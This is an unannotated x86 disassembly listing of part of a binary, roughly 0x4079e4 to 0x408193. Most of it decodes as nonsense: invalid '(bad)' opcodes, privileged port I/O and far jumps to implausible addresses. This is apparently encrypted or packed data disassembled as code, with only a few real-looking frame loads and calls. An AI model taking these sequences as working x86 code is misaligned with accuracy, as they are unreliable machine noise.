  4079e4:	push   edi
  4079e5:	shr    DWORD PTR [eax+edi*8],1
  4079e8:	push   ebp
  4079e9:	jp     0x407a68
  4079eb:	test   al,0xb9
  4079ed:	jb     0x407980
  4079ef:	pop    ebx
  4079f0:	fisubr WORD PTR [esi+0x4b4ab83d]
  4079f6:	xchg   edx,eax
  4079f7:	mov    es,WORD PTR [ebp+eiz*1-0x30]
  4079fb:	jnp    0x407984
  4079fd:	lods   eax,DWORD PTR ds:[esi]
  4079fe:	mov    al,0xf9
  407a00:	iret   
  407a01:	sbb    ebp,DWORD PTR [esp+ebp*1-0x36c0f356]
  407a08:	fldenv [edi]
  407a0a:	cld    
  407a0b:	loop   0x4079af
  407a0d:	das    
  407a0e:	shl    ecx,1
  407a10:	cmp    eax,0xbd2f4438
  407a15:	test   al,0xe
  407a17:	loope  0x407a33
  407a19:	and    al,0xa4
  407a1b:	fwait
  407a1c:	xor    BYTE PTR [ebx-0x49],bh
  407a1f:	pushf  
  407a20:	pop    edx
  407a21:	mov    ds:0x202f591f,al
  407a26:	lahf   
  407a27:	scas   eax,DWORD PTR es:[edi]
  407a28:	out    dx,eax
  407a29:	retf   0xfae2
  407a2c:	mov    bh,0x7
  407a2e:	jmp    0x407a67
  407a30:	xor    eax,0x33ad04f7
  407a35:	pop    ds
  407a36:	sahf   
  407a37:	jge    0x407a9f
  407a39:	mov    al,0x4c
  407a3b:	inc    ebx
  407a3c:	(bad)  
  407a3d:	mov    BYTE PTR [edx],dh
  407a3f:	jg     0x407a3c
  407a41:	xor    DWORD PTR [ebp+eax*8+0x1cc9408],ebx
  407a48:	imul   esp,DWORD PTR [ebx-0x574980de],0xffffffea
  407a4f:	adc    edx,DWORD PTR [ecx-0x24]
  407a52:	adc    eax,0x7aa9aa7e
  407a57:	xchg   edi,eax
  407a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a59:	cmp    bh,dl
  407a5b:	pop    ebp
  407a5c:	dec    ebx
  407a5d:	add    BYTE PTR [ebx-0x3f],ch
  407a60:	sub    bl,BYTE PTR [eax+0x61cf6ebd]
  407a66:	jp     0x407a60
  407a68:	mov    ebx,cs
  407a6a:	and    eax,0xc79bc08
  407a6f:	imul   ecx,DWORD PTR [ecx+0x3d],0x9a9984aa
  407a76:	mov    ch,0xcc
  407a78:	mov    edi,0x7ed96a5c
  407a7d:	mov    al,0x6e
  407a7f:	dec    ebp
  407a80:	adc    al,0x1f
  407a82:	inc    DWORD PTR [edx+0x77]
  407a85:	rcl    ch,1
  407a87:	(bad)  
  407a88:	lock test eax,0x2fff91d7
  407a8e:	addr16 push ebp
  407a90:	mov    ah,0x31
  407a92:	jnp    0x407a33
  407a94:	sub    DWORD PTR [edi+0xc38aaf7],esi
  407a9a:	ret    0xbffe
  407a9d:	cs adc esp,ebx
  407aa0:	and    ebx,DWORD PTR [ecx+0x68fd0dc2]
  407aa6:	push   edx
  407aa7:	cmp    BYTE PTR [ebp-0x43],bh
  407aaa:	push   edx
  407aab:	fld    QWORD PTR [ebx+0x13f369fd]
  407ab1:	in     eax,0xca
  407ab3:	sub    edi,DWORD PTR [ecx-0x37033258]
  407ab9:	mov    dl,0x4f
  407abb:	out    dx,eax
  407abc:	cmp    eax,0x81e9aea6
  407ac1:	into   
  407ac2:	push   es
  407ac3:	mov    ebp,0x7adbf8de
  407ac8:	mov    dl,0x16
  407aca:	rcl    BYTE PTR [eax],cl
  407acc:	cmp    BYTE PTR [ecx+0x472743b2],ch
  407ad2:	mov    ah,0x6d
  407ad4:	add    bh,BYTE PTR [eax-0x273a8b9e]
  407ada:	fcmovnb st,st(4)
  407adc:	jbe    0x407a70
  407ade:	stos   BYTE PTR es:[edi],al
  407adf:	cmc    
  407ae0:	and    bh,dl
  407ae2:	push   0xffffffc5
  407ae4:	jbe    0x407b41
  407ae6:	outs   dx,DWORD PTR ds:[esi]
  407ae7:	mov    ah,0x48
  407ae9:	adc    bl,BYTE PTR gs:0x2328bd0e
  407af0:	scas   al,BYTE PTR es:[edi]
  407af1:	cmp    eax,0x91208b21
  407af6:	push   es
  407af7:	xchg   ebp,esp
  407af9:	fdivr  st(6),st
  407afb:	pop    edi
  407afc:	mov    BYTE PTR [ecx+0x2],ch
  407aff:	popf   
  407b00:	mov    BYTE PTR [edx-0x2e],al
  407b03:	out    dx,al
  407b04:	inc    esp
  407b05:	xchg   ebx,eax
  407b06:	and    BYTE PTR [esi+eax*8-0x45],0x49
  407b0b:	sti    
  407b0c:	sahf   
  407b0d:	sub    ebx,DWORD PTR [eax-0x728496d4]
  407b13:	mov    dl,BYTE PTR [edx]
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	dec    ebp
  407b40:	cmp    esp,DWORD PTR [edi]
  407b42:	dec    edx
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b84
  407b4c:	dec    esi
  407b4d:	mov    dl,BYTE PTR [eax+0x7c500e3f]
  407b53:	mov    BYTE PTR [edx+eiz*8+0x74],0xaf
  407b58:	pop    ss
  407b59:	xor    al,0x48
  407b5b:	sahf   
  407b5c:	sahf   
  407b5d:	cmp    eax,0xfee8670f
  407b62:	push   edx
  407b63:	adc    ah,BYTE PTR [ebp+eax*2-0x23]
  407b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b68:	fadd   QWORD PTR [ebx-0x7b]
  407b6b:	ficomp WORD PTR [edi+eax*2+0x7c]
  407b6f:	mov    esi,?
  407b71:	cld    
  407b72:	cli    
  407b73:	push   edi
  407b74:	(bad)  
  407b75:	dec    esp
  407b76:	xor    BYTE PTR [ebx-0x72ece9b9],cl
  407b7c:	out    0xaa,eax
  407b7e:	jae    0x407b43
  407b80:	xor    DWORD PTR [ebx],0x5e
  407b83:	clc    
  407b84:	es dec ebp
  407b86:	inc    DWORD PTR [edx+0x1d]
  407b89:	dec    eax
  407b8a:	fld    TBYTE PTR [ecx-0xb]
  407b8d:	loopne 0x407b1a
  407b8f:	cli    
  407b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b91:	xchg   edi,eax
  407b92:	sub    esp,edi
  407b94:	xor    DWORD PTR [ecx-0x4f],esp
  407b97:	jnp    0x407be0
  407b99:	mov    ch,BYTE PTR [ebp-0x65]
  407b9c:	or     eax,0x861fe494
  407ba1:	shl    BYTE PTR [ecx+0x47bb249f],0x48
  407ba8:	cdq    
  407ba9:	sbb    eax,0xd9e13e1c
  407bae:	sbb    eax,0xb693db93
  407bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb4:	push   ecx
  407bb5:	cmp    esi,eax
  407bb7:	sbb    ah,dh
  407bb9:	daa    
  407bba:	das    
  407bbb:	inc    edi
  407bbc:	or     BYTE PTR [ebx+edx*4],al
  407bbf:	cli    
  407bc0:	pop    esi
  407bc1:	cli    
  407bc2:	sub    dl,dh
  407bc4:	shl    DWORD PTR [esi+0x79cbbfdb],0xc
  407bcb:	or     eax,ebp
  407bcd:	mov    ch,BYTE PTR [edi+eax*8+0x207442bd]
  407bd4:	mov    esi,0x73b4806
  407bd9:	push   cs
  407bda:	out    dx,eax
  407bdb:	inc    ebx
  407bdc:	add    ebp,0x67
  407bdf:	jg     0x407c4f
  407be1:	xlat   BYTE PTR ds:[ebx]
  407be2:	ret    0xad92
  407be5:	popf   
  407be6:	push   esp
  407be7:	adc    eax,DWORD PTR [ecx]
  407be9:	mov    ebx,cs
  407beb:	gs push cs
  407bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bee:	dec    esp
  407bef:	sbb    al,0xb4
  407bf1:	out    dx,al
  407bf2:	and    sp,WORD PTR ds:0xeb71d3d4
  407bf9:	xchg   BYTE PTR [esi-0x3210427],ch
  407bff:	mov    ecx,0xf81f67e6
  407c04:	pop    ds
  407c05:	add    esi,DWORD PTR [ebx-0x15f45b34]
  407c0b:	jecxz  0x407c12
  407c0d:	sbb    BYTE PTR [ecx+ebp*1-0x5c],ch
  407c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c12:	xchg   esp,eax
  407c13:	jg     0x407c28
  407c15:	retf   
  407c16:	xchg   ax,ax
  407c18:	pop    es
  407c19:	mov    dh,0x10
  407c1b:	mov    eax,0x7f5d3319
  407c20:	dec    esi
  407c21:	stos   DWORD PTR es:[edi],eax
  407c22:	pop    ecx
  407c23:	push   eax
  407c24:	stos   BYTE PTR es:[edi],al
  407c25:	xchg   esi,eax
  407c26:	out    dx,al
  407c27:	mul    BYTE PTR [eax]
  407c29:	jle    0x407bca
  407c2b:	push   0x5b
  407c2d:	sub    dl,cl
  407c2f:	dec    edi
  407c30:	and    BYTE PTR [edi+ebp*4],ah
  407c33:	push   ds
  407c34:	cmp    esp,DWORD PTR [edx-0xa1dc49]
  407c3a:	jmp    0x6131:0x6da85056
  407c41:	(bad)  
  407c42:	pop    ebp
  407c43:	adc    edi,DWORD PTR [esi-0x1a402498]
  407c49:	pop    ebp
  407c4a:	retf   
  407c4b:	jmp    0x7d184c19
  407c50:	mov    ds:0x69703bb5,eax
  407c55:	es stos DWORD PTR es:[edi],eax
  407c57:	test   dh,ah
  407c59:	mov    DWORD PTR [edi-0x64],ecx
  407c5c:	stos   BYTE PTR es:[edi],al
  407c5d:	jmp    0x12641d6d
  407c62:	inc    ecx
  407c63:	push   ecx
  407c64:	jae    0x407c20
  407c66:	clc    
  407c67:	cli    
  407c68:	and    eax,0xf18fc7dd
  407c6d:	retf   
  407c6e:	in     al,0xea
  407c70:	neg    esp
  407c72:	jne    0x407c15
  407c74:	add    eax,0xe7bd27bb
  407c79:	sar    BYTE PTR [esi+0x811f4df],cl
  407c7f:	popa   
  407c80:	inc    edx
  407c81:	es dec eax
  407c83:	pop    ds
  407c84:	mov    bh,0x4b
  407c86:	mov    ebp,cr5
  407c89:	jmp    0x1a59b3b0
  407c8e:	and    BYTE PTR [edi+0x542529a7],ch
  407c94:	fdivp  st(7),st
  407c96:	clc    
  407c97:	pop    esp
  407c98:	pop    edi
  407c99:	adc    eax,0x295888f6
  407c9e:	pop    ebp
  407c9f:	nop
  407ca0:	leave  
  407ca1:	ins    BYTE PTR es:[edi],dx
  407ca2:	adc    DWORD PTR [ebp+edx*4+0x9630691],edx
  407ca9:	or     edi,DWORD PTR [edi]
  407cab:	out    dx,al
  407cac:	xor    esi,ebp
  407cae:	mov    ebx,0xcd64815
  407cb3:	popa   
  407cb4:	pushf  
  407cb5:	and    al,0x9c
  407cb7:	lods   al,BYTE PTR ds:[esi]
  407cb8:	ds pushf 
  407cba:	rol    DWORD PTR [eax+0x5e5632fd],0xf4
  407cc1:	scas   al,BYTE PTR es:[edi]
  407cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cc3:	jns    0x407ce8
  407cc5:	xor    ecx,DWORD PTR [eax-0x15]
  407cc8:	xchg   esi,eax
  407cc9:	jg     0x407c67
  407ccb:	xlat   BYTE PTR ds:[ebx]
  407ccc:	mov    DWORD PTR [eax+0x7e863654],edi
  407cd2:	dec    esp
  407cd3:	dec    edi
  407cd4:	ins    DWORD PTR es:[edi],dx
  407cd5:	std    
  407cd6:	jb     0x407c93
  407cd8:	out    dx,eax
  407cd9:	or     al,0x1d
  407cdb:	push   0x55fab328
  407ce0:	sbb    ah,0xb2
  407ce3:	pop    edi
  407ce4:	add    BYTE PTR [edi],dl
  407ce6:	js     0x407d50
  407ce8:	and    eax,0x2428cfac
  407ced:	sub    ebx,DWORD PTR [ebx-0x5d]
  407cf0:	cmp    eax,0xaeb34d51
  407cf5:	div    esi
  407cf7:	dec    ecx
  407cf8:	sbb    eax,0x84248690
  407cfd:	ins    DWORD PTR es:[edi],dx
  407cfe:	add    eax,0xf5c46ec1
  407d03:	adc    dl,BYTE PTR [edx-0x1ace50c9]
  407d09:	test   al,0xfa
  407d0b:	sub    eax,0x44c3d5ab
  407d10:	(bad)  
  407d11:	and    bl,ch
  407d13:	add    bh,ah
  407d15:	mov    ebp,0x9fe805f4
  407d1a:	and    BYTE PTR [edi+0x7b],bl
  407d1d:	aas    
  407d1e:	xor    al,BYTE PTR [esi]
  407d20:	dec    esp
  407d21:	(bad)  
  407d22:	mov    ds,WORD PTR [esi-0x7db16e7c]
  407d28:	iret   
  407d29:	test   eax,0x426e844a
  407d2e:	out    0xf6,al
  407d30:	std    
  407d31:	pusha  
  407d32:	sar    ecx,0xe9
  407d35:	ss adc al,0xe3
  407d38:	xlat   BYTE PTR ds:[ebx]
  407d39:	fadd   QWORD PTR [ecx]
  407d3b:	add    ebp,eax
  407d3d:	stc    
  407d3e:	pop    ebx
  407d3f:	sub    BYTE PTR [esi],ah
  407d41:	pop    esp
  407d42:	dec    ecx
  407d43:	cmc    
  407d44:	stos   DWORD PTR es:[edi],eax
  407d45:	out    0x56,al
  407d47:	int    0xc4
  407d49:	rol    DWORD PTR [edx],1
  407d4b:	repnz out 0xc3,eax
  407d4e:	in     al,0x29
  407d50:	cmp    eax,0x9bcc26e4
  407d55:	ret    0x95b1
  407d58:	aad    0xa4
  407d5a:	shl    DWORD PTR [edi+edi*8-0x2f8bfc49],cl
  407d61:	faddp  st(6),st
  407d63:	or     ebx,DWORD PTR [eax+0x27]
  407d66:	jmp    0xe064:0xc07fae98
  407d6d:	adc    dh,BYTE PTR [edx+0xa8fe7af]
  407d73:	sbb    eax,0x290a4347
  407d78:	xchg   BYTE PTR [esp+eiz*8],dl
  407d7b:	jecxz  0x407dce
  407d7d:	pop    ecx
  407d7e:	rcr    DWORD PTR [ecx],cl
  407d80:	ret    
  407d81:	jmp    0x407d56
  407d83:	es scas eax,DWORD PTR es:[edi]
  407d85:	jg     0x407d0d
  407d87:	cli    
  407d88:	push   0x35
  407d8a:	fnstsw WORD PTR [edx]
  407d8c:	(bad)
  407d90:	inc    esi
  407d91:	push   cs
  407d92:	data16 aad 0xb8
  407d95:	sub    eax,0x260be07e
  407d9a:	les    ecx,FWORD PTR [ebx]
  407d9c:	daa    
  407d9d:	in     eax,0xe4
  407d9f:	mov    BYTE PTR [ebx-0x6f21c143],al
  407da5:	lods   eax,DWORD PTR ds:[esi]
  407da6:	pusha  
  407da7:	in     al,0xc6
  407da9:	jmp    0x407d48
  407dab:	stos   DWORD PTR es:[edi],eax
  407dac:	mov    BYTE PTR gs:[ebx-0x5648e958],bl
  407db3:	pop    ebx
  407db4:	lds    eax,FWORD PTR [edi+0x2df6cba5]
  407dba:	mov    esp,0xbd90f8a2
  407dbf:	jecxz  0x407e1a
  407dc1:	xor    ebx,DWORD PTR [edi+0x60fa31e]
  407dc7:	cmp    ch,dl
  407dc9:	dec    edi
  407dca:	jg     0x407e2e
  407dcc:	jle    0x407d96
  407dce:	retf   0xd9a0
  407dd1:	out    0x32,eax
  407dd3:	fnsave [edi]
  407dd5:	std    
  407dd6:	(bad)
  407dd9:	sub    eax,0xa4ba85ef
  407dde:	add    edi,edi
  407de0:	inc    edx
  407de1:	sti    
  407de2:	and    esi,DWORD PTR [ebx]
  407de4:	dec    edi
  407de5:	and    edi,ebx
  407de7:	iret   
  407de8:	cmp    al,0x7
  407dea:	adc    BYTE PTR [edi],cl
  407dec:	dec    esi
  407ded:	or     al,0x4b
  407def:	mov    bl,0xcb
  407df1:	or     DWORD PTR [edx],edx
  407df3:	push   esi
  407df4:	jb     0x407d9e
  407df6:	push   cs
  407df7:	adc    eax,0x5eefdba9
  407dfc:	mov    ch,0x99
  407dfe:	ins    DWORD PTR es:[edi],dx
  407dff:	call   0x13efe9d4
  407e04:	int3   
  407e05:	lock hlt 
  407e07:	mov    eax,ds:0x27c1186a
  407e0c:	inc    ecx
  407e0d:	xchg   ebx,eax
  407e0e:	push   esi
  407e0f:	setg   BYTE PTR [ebx-0x6b]
  407e13:	out    dx,al
  407e14:	push   ebx
  407e15:	bound  ebp,QWORD PTR [esi+0x725217d7]
  407e1b:	xor    bl,BYTE PTR [ebp-0x26]
  407e1e:	(bad)  
  407e1f:	pusha  
  407e20:	ins    DWORD PTR es:[edi],dx
  407e21:	cdq    
  407e22:	mov    DWORD PTR [ebp+0x84d285d],esi
  407e28:	fwait
  407e29:	scas   eax,DWORD PTR es:[edi]
  407e2a:	jae    0x407e5d
  407e2c:	pop    esi
  407e2d:	enter  0xd7c,0x34
  407e31:	dec    esi
  407e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e33:	jl     0x407e5e
  407e35:	(bad)  
  407e36:	sbb    eax,0x2a3a3997
  407e3b:	scas   eax,DWORD PTR es:[edi]
  407e3c:	pushf  
  407e3d:	xor    DWORD PTR [ecx+0x78aa4df5],0xe77ed8f9
  407e47:	in     al,0x60
  407e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e4a:	cmp    ebx,esp
  407e4c:	es cmp al,0xe6
  407e4f:	inc    ecx
  407e50:	sub    ah,BYTE PTR [ebp-0x40]
  407e53:	outs   dx,DWORD PTR ds:[esi]
  407e54:	and    dl,al
  407e56:	call   0x93e5:0x4730b08d
  407e5d:	(bad)
  407e61:	aam    0x1e
  407e63:	mov    bh,0x20
  407e65:	out    dx,eax
  407e66:	out    0x19,al
  407e68:	jecxz  0x407ead
  407e6a:	inc    eax
  407e6b:	fisubr WORD PTR [esi+edi*8-0x7ebb1cd6]
  407e72:	loop   0x407e9b
  407e74:	ror    DWORD PTR [eax-0x7796680c],0xa5
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	jb     0x407e99
  407e9a:	jge    0x407e41
  407e9c:	pop    es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407eca
  407ea5:	out    dx,eax
  407ea6:	je     0x407e88
  407ea8:	xchg   edx,eax
  407ea9:	ficomp WORD PTR [ecx+0x19f59005]
  407eaf:	ror    DWORD PTR [edx-0x96d5dd7],1
  407eb5:	cmp    eax,0xf4182a7c
  407eba:	loop   0x407e9e
  407ebc:	jmp    0x1a36749f
  407ec1:	cmp    al,0xe0
  407ec3:	cmp    bl,bl
  407ec5:	jle    0x407eb0
  407ec7:	shr    DWORD PTR [eax-0x30],0xf3
  407ecb:	out    dx,al
  407ecc:	adc    ebx,eax
  407ece:	mov    ch,0x8b
  407ed0:	sbb    DWORD PTR [ebp-0x4e7bcca1],eax
  407ed6:	add    DWORD PTR [eax-0x74fa4587],0xf8616801
  407ee0:	(bad)  
  407ee2:	test   cl,ch
  407ee4:	loop   0x407f5e
  407ee6:	(bad)  
  407ee7:	not    ebx
  407ee9:	or     esi,DWORD PTR [edx-0x1053e5d4]
  407eef:	sub    al,0xe2
  407ef1:	outs   dx,BYTE PTR ds:[esi]
  407ef2:	and    bh,BYTE PTR gs:[ebx+0x22]
  407ef6:	cmp    al,0x5f
  407ef8:	imul   eax,ebx,0x48
  407efb:	push   ebx
  407efc:	pop    ebp
  407efd:	add    eax,0xba501b2b
  407f02:	aad    0x8a
  407f04:	lea    edi,[ebx-0x6c]
  407f07:	into   
  407f08:	(bad)  
  407f09:	loope  0x407ea9
  407f0b:	cmp    bl,BYTE PTR [eax]
  407f0d:	repz rcl cl,cl
  407f10:	mov    cl,BYTE PTR [ebx-0x61]
  407f13:	lahf   
  407f14:	sbb    ah,BYTE PTR [ebx+ebp*4-0x49]
  407f18:	in     eax,0xb3
  407f1a:	push   esi
  407f1b:	xchg   edx,eax
  407f1c:	out    dx,eax
  407f1d:	ins    BYTE PTR es:[edi],dx
  407f1e:	sahf   
  407f1f:	dec    ecx
  407f20:	mov    BYTE PTR ds:0xfced1668,dl
  407f26:	test   eax,0xfac56272
  407f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f2c:	ret    0x805b
  407f2f:	push   esp
  407f30:	cmp    eax,0xe224151d
  407f35:	ror    bh,cl
  407f37:	fwait
  407f38:	pop    ebp
  407f39:	retf   
  407f3a:	xchg   ecx,eax
  407f3b:	mov    eax,0xa06f3941
  407f40:	jo     0x407f8b
  407f42:	mul    BYTE PTR [ebp+0x39439665]
  407f48:	jle    0x407fa0
  407f4a:	icebp  
  407f4b:	clc    
  407f4c:	or     cl,BYTE PTR [ebp-0x35]
  407f4f:	out    dx,eax
  407f50:	fimul  DWORD PTR [edi+eiz*4]
  407f53:	cmp    esp,eax
  407f55:	push   0xffffff87
  407f57:	mov    esp,0x19b0fc1c
  407f5c:	sbb    BYTE PTR [edx+0x4f1239f0],cl
  407f62:	inc    eax
  407f63:	dec    edi
  407f64:	inc    esp
  407f65:	add    bh,BYTE PTR [ebp-0x4ee6cf97]
  407f6b:	cli    
  407f6c:	ffreep st(0)
  407f6e:	adc    BYTE PTR [edi],cl
  407f70:	ret    0xc80a
  407f73:	js     0x407ef5
  407f75:	inc    edi
  407f76:	cmp    al,0x14
  407f78:	sbb    DWORD PTR [ebx],eax
  407f7a:	repnz outs dx,DWORD PTR ds:[esi]
  407f7c:	div    DWORD PTR [edx-0x1b8e2a59]
  407f82:	call   0xf9b0:0xd452492
  407f89:	popf   
  407f8a:	call   0xf39e:0x59292f20
  407f91:	icebp  
  407f92:	pop    ebp
  407f93:	pop    DWORD PTR [edi-0x8b804e3]
  407f99:	jge    0x407fdd
  407f9b:	add    eax,0xe5899d29
  407fa0:	outs   dx,DWORD PTR ds:[esi]
  407fa1:	stos   DWORD PTR es:[edi],eax
  407fa2:	add    eax,0x1928ce5a
  407fa7:	pop    esp
  407fa8:	jmp    0x407ff8
  407faa:	imul   ecx,DWORD PTR [esp+ecx*8+0x1d1f42e6],0x15
  407fb2:	xchg   ebp,eax
  407fb3:	or     dh,bl
  407fb5:	jnp    0x407f83
  407fb7:	sbb    BYTE PTR [eax+ecx*1+0x5ed6d32b],0x8d
  407fbf:	outs   dx,BYTE PTR ds:[esi]
  407fc0:	sti    
  407fc1:	jo     0x407f44
  407fc3:	pop    ebp
  407fc4:	add    ah,BYTE PTR [edx-0x5e]
  407fc7:	leave  
  407fc8:	mov    bh,ch
  407fca:	icebp  
  407fcb:	je     0x40803c
  407fcd:	inc    esp
  407fce:	xor    al,0x5e
  407fd0:	cdq    
  407fd1:	pop    esp
  407fd2:	das    
  407fd3:	test   DWORD PTR [ebx+0x1c10d98a],0xc9c1a80b
  407fdd:	pop    ss
  407fde:	(bad)  
  407fe0:	ficom  DWORD PTR [eax-0x4d]
  407fe3:	inc    esp
  407fe4:	shl    ebp,1
  407fe6:	adc    eax,0xaed06e57
  407feb:	fs inc edx
  407fed:	retf   
  407fee:	add    dh,BYTE PTR cs:[eax-0x76a069c1]
  407ff5:	push   esi
  407ff6:	jle    0x408014
  407ff8:	cmovns ecx,DWORD PTR [ebx-0x12]
  407ffc:	ja     0x40801a
  407ffe:	aad    0x1
  408000:	dec    eax
  408001:	cld    
  408002:	and    DWORD PTR [eax-0x2],eax
  408005:	pop    eax
  408006:	inc    esp
  408007:	adc    ebx,DWORD PTR [ebp-0x6b6780b]
  40800d:	out    0x14,eax
  40800f:	inc    ebp
  408010:	add    BYTE PTR [ecx+0x59],bh
  408013:	pop    ss
  408014:	ds out dx,eax
  408016:	push   esp
  408017:	ins    BYTE PTR es:[edi],dx
  408018:	mov    ah,0x77
  40801a:	neg    BYTE PTR ds:0xd608ea22
  408020:	icebp  
  408021:	add    DWORD PTR [edi-0x71],ebp
  408024:	les    ecx,FWORD PTR [ebx+0x49]
  408027:	or     eax,0x5d092737
  40802c:	out    0xe9,al
  40802e:	in     eax,0x77
  408030:	push   ss
  408031:	scas   eax,DWORD PTR es:[edi]
  408032:	pusha  
  408033:	adc    DWORD PTR [ebx],0xffffff90
  408036:	stos   DWORD PTR es:[edi],eax
  408037:	sbb    esi,esp
  408039:	mov    ds:0x580eae16,eax
  40803e:	aad    0x79
  408040:	or     al,0x1e
  408042:	inc    ecx
  408043:	bound  edi,QWORD PTR ds:0x4d509a08
  408049:	cdq    
  40804a:	repnz rcr DWORD PTR ds:0x53ca0af7,0x0
  408052:	mov    ah,0xd7
  408054:	stos   BYTE PTR es:[edi],al
  408055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408056:	cdq    
  408057:	xor    dl,dl
  408059:	std    
  40805a:	mov    DWORD PTR [edx],ebp
  40805c:	lds    ebx,FWORD PTR [esp+ebx*2-0x7a]
  408060:	repz aaa 
  408062:	inc    eax
  408063:	mov    WORD PTR [eax-0x20],ds
  408066:	std    
  408067:	sub    BYTE PTR [esi+0x76feebbd],ch
  40806d:	mov    esi,0x56b5d4d8
  408072:	and    eax,0x364105f6
  408077:	shl    BYTE PTR [edi-0x6e624e6],cl
  40807d:	add    esi,DWORD PTR [eax-0x7f88c93]
  408083:	and    bl,BYTE PTR [eax]
  408085:	dec    ebx
  408086:	pop    ss
  408087:	pusha  
  408088:	sub    ebp,DWORD PTR [edx]
  40808a:	dec    edi
  40808b:	sahf   
  40808c:	sete   BYTE PTR [edi]
  40808f:	mov    ch,0x3e
  408091:	jp     0x408040
  408093:	or     al,0xcb
  408095:	ss cmp eax,0xe049690e
  40809b:	add    eax,0x26963e5c
  4080a0:	lea    eax,[ebx+0x3d4a5637]
  4080a6:	dec    ebx
  4080a7:	mov    esi,eax
  4080a9:	pushf  
  4080aa:	xor    ecx,DWORD PTR [esi]
  4080ac:	stos   BYTE PTR es:[edi],al
  4080ad:	inc    edi
  4080ae:	leave  
  4080af:	xchg   BYTE PTR ds:[eax-0x69abd0b4],ch
  4080b6:	arpl   WORD PTR [edx+edi*2-0x1ba3441],bx
  4080bd:	sub    eax,0xe666c568
  4080c2:	les    edi,FWORD PTR [ecx+0x4c862e9f]
  4080c8:	in     al,dx
  4080c9:	push   ebx
  4080ca:	mov    ch,0xc8
  4080cc:	cmp    eax,DWORD PTR [ecx]
  4080ce:	mov    edi,0xf83d0e60
  4080d3:	addr16 inc eax
  4080d5:	test   al,0x36
  4080d7:	sbb    al,0x1
  4080d9:	push   esi
  4080da:	shl    bh,0x84
  4080dd:	push   ebx
  4080de:	cdq    
  4080df:	pop    esi
  4080e0:	in     al,dx
  4080e1:	or     DWORD PTR [edx-0x56c0268d],esp
  4080e7:	iret   
  4080e8:	push   edi
  4080e9:	call   0xc55e10d
  4080ee:	out    0x79,eax
  4080f0:	or     DWORD PTR [esi],edi
  4080f2:	sbb    eax,edi
  4080f4:	arpl   WORD PTR [eax],bx
  4080f6:	int3   
  4080f7:	(bad)  
  4080f8:	ins    DWORD PTR es:[edi],dx
  4080f9:	push   edx
  4080fa:	std    
  4080fb:	pushf  
  4080fc:	ss push ebp
  4080fe:	popf   
  4080ff:	jnp    0x4080cb
  408101:	leave  
  408102:	stos   DWORD PTR es:[edi],eax
  408103:	xor    al,0x1d
  408105:	mov    cl,BYTE PTR [esi+0x49016f45]
  40810b:	dec    ecx
  40810c:	adc    BYTE PTR gs:[ecx],bl
  40810f:	jmp    0x4080a3
  408111:	adc    ebx,DWORD PTR [eax-0x52]
  408114:	inc    esp
  408115:	pop    es
  408116:	push   ds
  408117:	in     eax,dx
  408118:	cmp    BYTE PTR [ebp+0x12d48d30],0xe2
  40811f:	and    BYTE PTR [eax+0x7b7dfb51],dl
  408125:	sub    eax,0xd0db31dc
  40812a:	mov    ah,BYTE PTR [esi]
  40812c:	dec    BYTE PTR [ecx-0x1af99701]
  408132:	xor    BYTE PTR [edi],cl
  408134:	xlat   BYTE PTR ds:[ebx]
  408135:	pslld  mm4,mm1
  408138:	fmulp  st(4),st
  40813a:	sub    dl,bl
  40813c:	pop    esp
  40813d:	lds    edx,FWORD PTR [edx]
  40813f:	or     DWORD PTR [esi-0x1],ecx
  408142:	push   ds
  408143:	mov    eax,ds:0x281e3005
  408148:	pop    esp
  408149:	call   0xd2a1:0x15ded71c
  408150:	cdq    
  408151:	lods   al,BYTE PTR ds:[esi]
  408152:	dec    DWORD PTR [edi]
  408154:	mov    dh,0xfd
  408156:	or     ch,bh
  408158:	pop    esi
  408159:	jp     0x6994a646
  40815f:	repz into 
  408161:	sub    eax,0xdf19ce17
  408166:	mov    bh,0x61
  408168:	mov    edx,0x5c67b85b
  40816d:	(bad)  
  40816e:	ins    DWORD PTR es:[edi],dx
  40816f:	in     eax,0xcb
  408171:	mov    al,ds:0x3877444f
  408176:	popf   
  408177:	pop    eax
  408178:	push   ds
  408179:	(bad)  
  40817b:	out    0xde,eax
  40817d:	or     al,0xb7
  40817f:	out    dx,eax
  408180:	ror    dl,0x89
  408183:	sbb    eax,0x54e5a924
  408188:	mov    al,0x82
  40818a:	mov    ah,0x41
  40818c:	add    ebx,edx
  40818e:	mov    bl,0xe2
  408190:	sbb    bh,bl
  408192:	cwde   
  408193:	mov    eax,0xd31363d9
